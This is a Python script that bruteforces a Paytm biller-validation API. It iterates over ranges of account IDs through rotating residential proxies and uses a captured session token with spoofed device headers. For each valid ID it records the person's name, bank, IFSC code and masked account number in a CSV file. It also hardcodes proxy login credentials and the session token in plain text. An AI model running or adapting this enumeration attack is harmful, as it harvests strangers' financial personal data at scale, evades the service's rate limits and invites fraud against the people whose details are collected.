import requests
import json
import csv
import sys
from tqdm import tqdm
import random
import concurrent.futures


username = "ankitkk"
password = "Passwd221"
proxies = {
    "https": f"https://customer-{username}-cc-IN:{password}@pr.oxylabs.io:7777"
}

def send_request(i):
    url = "https://digitalproxy.paytm.com/billerservice/auth/v1/validateBiller?channel=ANDROIDAPP&deviceIdentifier=OnePlus-AC2001-271be052df9325b4&playStore=false&osVersion=13&client=androidapp&lang_id=1&language=en&deviceManufacturer=OnePlus&networkType=4G&locale=en-IN&deviceName=AC2001&version=10.22.0&child_site_id=1&site_id=1"

    headers = {
    "Host": "digitalproxy.paytm.com",
    "Accept-Charset": "UTF-8",
    "Sso_token": "eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0..TefiT_1HqGS84hCJ.vR7xnyK3l_7LEJ-bkkjv6DFNUInrx7pCdL2FqIzWUtEUNdWmLi7tpMV6sz1PmyVyTSPp6ZZdEXCRYNBYFoy18CtVhOrSJVB--n2uyhMrLwxzZyymuda0W2-8HPI_AHyyVYAY5oXEZdYGtpANAOrjNgNPwyW92AxpiJZuQ6EZxLrEwWfZ_6QvL_EmwtdZJvGZHeEf8_CjnC3KScEuKxgP-ePkQsYM9n7s41L4f2Dxc0K06eMzEK9xdeVjoDRpBEn0Na6Rv4j18BJkYFIy.OECeh9dmevGkliCFlcMXAw1700",
    "X-App-Rid": "271be052df9325b4:1683475574944:2:26",
    "Accept-Encoding": "gzip, deflate",
    "If-None-Match": 'W/"104-fz0VDzb0ieZnQGOyNWkSJdXMSPM"',
    "Advertising_id": "ab6567db-3ff7-40a8-a7d9-86d5c43fc7f1",
    "User-Agent": "Paytm Release/10.22.0/721076 (net.one97.paytm; source=unknown; integrity=true; auth=true; en-IN; okhttp 4.9.1) Android/13 OnePlus/AC2001 (arm64-v8a; resolution=3.0; cores=8)",
    "Content-Type": "application/json",
    "Content-Length": "108",
}

    random_product_id = str(random.randint(100000000, 999999999))  # Generate a random 9-digit number
    data = {
        "productId": random_product_id,
        "paymentMode": "Mobile",
        "categoryId": 262072,
        "billerInfo": {"accountId": str(i)},
    }

    response = requests.post(url, headers=headers, data=json.dumps(data), proxies=proxies)
    response_data = response.json()

    if response_data['code'] == '00' and response_data['status'] == True:
        biller_info = response_data['billerInfo']
        with open('10th_may.csv', 'a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([biller_info['accountId'], biller_info['ifscCode'], biller_info['name'], biller_info['bankName'], biller_info['maskedBankAccount']])
        return True
    else:
        return False

def bruteforce_requests(start, end):
    success_count = 0
    fail_count = 0

    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_req = {executor.submit(send_request, i): i for i in range(start, end+1)}
        progress = tqdm(concurrent.futures.as_completed(future_to_req), total=end-start+1)
        for future in progress:
            result = future.result()
            if result:
                success_count += 1
            else:
                fail_count += 1
            progress.set_description(f"Successful requests: {success_count} | Failed requests: {fail_count}")

# Get start and end numbers from user input
start = int(input("Enter the start number: "))
end = int(input("Enter the end number: "))

# Call the function with the user input
bruteforce_requests(start, end)s